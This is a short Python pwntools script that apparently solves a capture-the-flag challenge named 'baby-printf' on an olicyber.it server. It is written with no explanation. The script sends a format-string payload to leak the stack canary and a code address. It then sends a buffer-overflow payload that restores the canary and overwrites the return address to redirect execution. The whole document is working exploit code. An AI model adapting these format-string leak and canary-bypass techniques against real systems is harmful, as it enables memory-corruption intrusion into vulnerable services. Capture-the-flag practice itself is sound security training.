from pwn import *

r=remote("baby-printf.challs.olicyber.it", 34004)
r.recv(4810)
payloadc=(b'%11$lx.%15$lx')
r.sendline(payloadc)
result = r.recvline().strip().decode()
canary=int(result.split(".")[0],16)
main = int(result.split(".")[1],16)
payload=b"A"*40+p64(canary)+b"A"*8+p64(main-0x36)
r.sendline(payload)
r.sendline(b"!q")
r.recvline()
print(r.recv(281).decode())